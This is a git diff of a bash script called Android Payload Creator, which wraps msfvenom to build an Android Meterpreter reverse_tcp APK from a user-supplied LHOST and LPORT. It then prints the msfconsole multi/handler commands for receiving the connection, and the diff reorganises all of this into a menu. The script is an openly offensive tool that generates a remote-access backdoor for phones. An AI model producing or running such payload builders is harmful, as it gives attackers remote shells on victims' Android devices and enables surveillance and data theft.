@@ -45,23 +45,28 @@ cat << "EOF"
 EOF
 
 echo -e "\n$reset$bold              APC$reset"
-echo -e "    Android Payload Creator.\n"
+echo -e "    Android Payload Creator."
+echo -e "      Payload by$blue MSFVenom\n"
 sleep 3
 echo -e "$reset Author:$blue Haitham Aouati"
 echo -e "$reset Version:$light_yellow 1.0 $white\n"
 echo -e "$reset Repo: https://github.com/haithamaouati/apc\n"
 
-read -p 'LHOST (e.g. 127.0.0.1): ' host
-read -p 'LPORT (e.g. 4444): ' port
-read -p 'Output (e.g. payload.apk): ' output
-sleep 3
-echo -e "\n$light_green[+]$reset Lhost: $host"
-echo -e "$light_green[+]$reset Lport: $port"
-echo -e "$light_green[+]$reset Output: $output\n"
-echo -e "$light_green[*]$reset Creating payload...\n"
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > $output
-echo -e "$light_green[✓]$reset Payload created.\n"
 
+function create () {
+    read -p 'LHOST (e.g. 127.0.0.1): ' host
+    read -p 'LPORT (e.g. 4444): ' port
+    read -p 'Output (e.g. payload.apk): ' output
+
+    echo -e "\n$light_green[+]$reset Lhost: $host"
+    echo -e "$light_green[+]$reset Lport: $port"
+    echo -e "$light_green[+]$reset Output: $output\n"
+    echo -e "$light_green[*]$reset Creating payload...\n"
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > $output
+    echo -e "$light_green[✓]$reset Payload created.\n"
+}
+
+function listing () {
 echo -e "Type:\n"
 echo -e " msfconsole"
 echo -e " use multi/handler"
@@ -69,3 +74,30 @@ echo -e " set payload android/meterpreter/reverse_tcp"
 echo -e " set Lhost $host"
 echo -e " set Lport $port"
 echo -e " exploit\n"
+}
+
+function update () {
+    echo -e "$light_green[*]$reset Updating repo...\n"
+    sleep 3
+    git pull https://github.com/haithamaouati/apc
+    echo -e "\n$light_green[✓]$reset Repository updated.\n"
+}
+
+function close () {
+    echo -e "\n$reset Time spend:$light_green $SECONDS seconds\n"
+    exit
+}
+
+echo -e "$light_yellow 1)$reset Create Payload"
+echo -e "$light_yellow 2)$reset Listing Target"
+echo -e "$light_yellow 3)$reset Update Repo"
+echo -e "$light_yellow 0)$reset Exit\n"
+
+read -p "#? " -e -n 1 -s choice;
+    case "$choice" in
+            1) create;;
+            2) listing;;
+            3) update;;
+            0) close;;
+            *) echo -e "\n$red[!]$reset Not a valid choice.\n";;
+    esac
